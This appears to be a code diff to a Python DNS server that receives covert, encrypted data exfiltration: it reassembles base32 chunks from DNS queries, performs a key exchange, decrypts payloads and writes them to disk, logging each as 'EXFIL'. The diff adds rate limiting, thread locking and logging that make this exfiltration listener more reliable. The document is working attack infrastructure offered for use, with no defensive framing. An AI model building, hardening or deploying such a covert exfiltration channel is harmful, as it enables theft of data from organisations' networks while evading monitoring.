@@ -36,14 +36,34 @@ from dotenv import load_dotenv, find_dotenv
 
 # Configure environment and logging
 load_dotenv(find_dotenv())
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('server')
 
 # === Session State ===
+_session_lock = threading.Lock()
 fragments_by_id = defaultdict(dict)
 last_seen = defaultdict(lambda: time.time())
 shared_keys = {}
 client_key_buffers = defaultdict(list)
+
+# === Rate Limiting ===
+_rate_lock = threading.Lock()
+_ip_timestamps = defaultdict(list)
+RATE_LIMIT_WINDOW = 60   # seconds
+RATE_LIMIT_MAX = 200     # max requests per IP per window
+
+
+def is_rate_limited(ip: str) -> bool:
+    """Return True if the given IP has exceeded the per-window request limit."""
+    now = time.time()
+    with _rate_lock:
+        ts = _ip_timestamps[ip]
+        # Prune entries outside the current window
+        _ip_timestamps[ip] = [t for t in ts if now - t < RATE_LIMIT_WINDOW]
+        if len(_ip_timestamps[ip]) >= RATE_LIMIT_MAX:
+            return True
+        _ip_timestamps[ip].append(now)
+        return False
 
 
 # === Cryptographic Utilities ===
@@ -145,13 +165,15 @@ def handle_key_exchange(identifier, payload):
     decode when complete, derive shared AES/HMAC keys, store them.
     Returns True when keys established.
     """
-    client_key_buffers[identifier].extend(payload.split('.'))
-    b32 = ''.join(client_key_buffers[identifier])
+    with _session_lock:
+        client_key_buffers[identifier].extend(payload.split('.'))
+        b32 = ''.join(client_key_buffers[identifier])
     if len(b32) >= 52:
         padded = pad_base32_string(b32)
         client_pub = base64.b32decode(padded)
         aes_key, hmac_key = derive_shared_key(handle_request.server_priv, client_pub)
-        shared_keys[identifier] = (aes_key, hmac_key)
+        with _session_lock:
+            shared_keys[identifier] = (aes_key, hmac_key)
         logger.info(f"[{identifier}] Session keys established")
         return True
     return False
@@ -161,17 +183,20 @@ def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
     """
     Store payload chunk, and when all received, assemble and process.
     """
-    fragments_by_id[identifier][int(index)] = payload
-    last_seen[identifier] = time.time()
+    with _session_lock:
+        fragments_by_id[identifier][int(index)] = payload
+        last_seen[identifier] = time.time()
+        received = len(fragments_by_id[identifier])
 
-    if len(fragments_by_id[identifier]) == int(total):
-        b32_str = ''.join(fragments_by_id[identifier][i] for i in sorted(fragments_by_id[identifier]))
+    if received == int(total):
+        with _session_lock:
+            b32_str = ''.join(fragments_by_id[identifier][i] for i in sorted(fragments_by_id[identifier]))
+            aes_key, hmac_key = shared_keys.get(identifier, (None, None))
         padded = pad_base32_string(b32_str)
         payload_bytes, tag = decode_and_split(padded)
         if payload_bytes is None:
             return
 
-        aes_key, hmac_key = shared_keys.get(identifier, (None, None))
         if not verify_hmac(payload_bytes, tag, hmac_key):
             return
 
@@ -187,7 +212,10 @@ def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
         file_path = os.path.join(out_dir, f"{identifier}.bin")
         with open(file_path, 'wb') as f:
             f.write(plaintext)
-        logger.info(f"[{identifier}] File written: {file_path}")
+        logger.info(
+            f"EXFIL session_id={identifier} chunks={total} "
+            f"plaintext_bytes={len(plaintext)} output={file_path}"
+        )
 
 
 def handle_request(data, addr, sock, args):
@@ -195,6 +223,11 @@ def handle_request(data, addr, sock, args):
     Main DNS packet handler: routes key exchange, data chunk logic,
     and serves the public-key TXT record under public.<domain>.
     """
+    client_ip = addr[0]
+    if is_rate_limited(client_ip):
+        logger.warning(f"Rate limit exceeded for {client_ip}, dropping request")
+        return
+
     # Parse QNAME and QTYPE once
     req = DNSRecord.parse(data)
     qname = str(req.q.qname).rstrip('.')
@@ -269,8 +302,9 @@ def cleanup_stale(ttl=600, interval=60):
     """
     while True:
         now = time.time()
-        for ident, timestamp in list(last_seen.items()):
-            if now - timestamp > ttl:
+        with _session_lock:
+            stale = [ident for ident, ts in last_seen.items() if now - ts > ttl]
+            for ident in stale:
                 fragments_by_id.pop(ident, None)
                 shared_keys.pop(ident, None)
                 client_key_buffers.pop(ident, None)
@@ -293,7 +327,7 @@ def start_server(args):
     with open(args.server_pubkey, 'rb') as f:
         pub = x25519.X25519PublicKey.from_public_bytes(f.read())
     handle_request.server_pub_b32 = base64.b32encode(
-        pub.public_bytes(encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw))
+        pub.public_bytes(encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw)).decode('ascii')
 
     thread = threading.Thread(target=cleanup_stale, daemon=True)
     thread.start()
@@ -325,3 +359,4 @@ if __name__ == '__main__':
     parser.add_argument('--server-pubkey', default=os.getenv('SERVER_PUBLIC_KEY'), help='Path to server public key')
     args = parser.parse_args()
     start_server(args)
+
